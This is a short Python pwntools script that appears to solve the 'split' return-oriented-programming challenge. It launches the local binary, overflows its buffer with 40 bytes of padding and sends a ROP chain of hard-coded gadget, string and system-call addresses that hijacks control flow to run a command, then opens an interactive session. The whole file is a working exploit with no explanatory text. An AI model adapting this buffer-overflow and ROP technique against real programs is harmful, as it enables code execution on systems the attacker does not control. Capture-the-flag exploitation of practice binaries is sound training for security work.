from pwn import *

target = process("./split")

target.sendline("a"*40 + p64(0x4007c3) + p64(0x601060) + p64(0x400560))
target.interactive()
